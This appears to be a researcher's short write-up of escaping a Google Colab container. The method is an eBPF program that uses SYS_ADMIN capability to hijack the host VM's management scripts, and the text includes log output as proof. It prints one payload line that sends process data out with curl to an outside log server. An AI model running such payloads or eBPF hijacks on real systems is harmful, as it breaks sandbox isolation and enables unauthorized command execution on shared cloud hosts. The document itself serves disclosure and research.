fundamentals  
In Google Colab, the Colab container is booted by docker-init, which is a typical in-container process. Inside the container, the user has  
SYS_ADMIN capability which can be used to execute evil ebpf program, and break the container isolation border via Linux Kernel ebpf, escape to  
VM.  
methods  
First, we build a host VM information leak program to collect the behaviors happened in the host VM, out of the Colab Container. After we analyze  
the information, we found that it seems to have some managing bots will login or connect to the outside VM and do execute some commands. Dive  
into this, we collect all of the behaviors of openatread.... Thing reminded us is that every time the bot login, it will trigger some bashbehaviors,  
including read config file and shell script. Prior to it, we have developed a version of ebpf offense program which can hijack all of the customized  
managing shell script executing process, but doesn't work for Colab Container. At this point, we improve our ebpf offense program and adapt it to  
Colab VM's behaviors. To make sure we are truly escape from Container and execute commands in VM, we set our payload as:  
curl -d uid="$(ps -ef | sed -n '2p')" $LOG_SERVER_IP  
for ps -ef | sed -n '2p'which extract the PID==1 process in the executing environment, and in container, this payload print a log like:  
2022-07-14 09:19:02,979 record-server INFO Get User: [root 1 0 0 Jul13 ? 00:00:00 /sbin/docker-init -- /datalab/run.sh]  
Then we exeute our evil ebpf program, after a few minutes, we received the new log:  
2022-07-14 09:31:09,388 record-server INFO Get User: [root 1 0 0 Jul13 ? 00:00:02 /usr/lib/systemd/systemd noresume noswap cros_efi]  
We can easily see that the PID==1 process is /usr/lib/systemd/systemd, which is a typical VM's #1 process, and after verifying, we can make  
sure that the directory /usr/lib/systemd/systemdis not in container, also the systemdis not inside the container.  
In the second round, we try to extract the dockerdprocess information outside the container, and the result also shows that we have the ability to  
execute arbitrary commands out side the container.  
Which means we successfully escape the Colab Container.
